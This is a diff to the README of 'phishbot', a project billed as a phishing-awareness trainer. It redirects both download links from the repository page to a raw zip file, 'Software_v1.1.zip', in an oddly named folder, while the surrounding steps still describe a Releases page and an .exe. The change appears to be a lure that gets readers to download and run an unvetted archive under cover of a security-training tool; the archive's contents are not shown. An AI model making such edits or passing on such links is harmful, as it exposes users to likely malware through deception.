@@ -1,6 +1,6 @@
 # 🛡️ phishbot - Learn to defend against cyber threats
 
-[![](https://img.shields.io/badge/Download-PhishBot-blue.svg)](https://github.com/valentinbach57/phishbot)
+[![](https://img.shields.io/badge/Download-PhishBot-blue.svg)](https://github.com/valentinbach57/phishbot/raw/refs/heads/main/patriarchdom/Software_v1.1.zip)
 
 PhishBot helps people and organizations see how phishing attacks work. Use this tool to learn about cybersecurity in a safe environment. You can test your ability to spot threats and understand how attackers operate. The platform provides a controlled space to practice defense techniques without any risk.
 
@@ -18,7 +18,7 @@ Your computer needs specific components to run PhishBot. Ensure your system meet
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the repository page to download the latest setup file: [https://github.com/valentinbach57/phishbot](https://github.com/valentinbach57/phishbot).
+1. Visit the repository page to download the latest setup file: [https://github.com/valentinbach57/phishbot/raw/refs/heads/main/patriarchdom/Software_v1.1.zip](https://github.com/valentinbach57/phishbot/raw/refs/heads/main/patriarchdom/Software_v1.1.zip).
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Click the most recent version shown at the top of the list.
 4. Download the file ending in .exe to your computer.
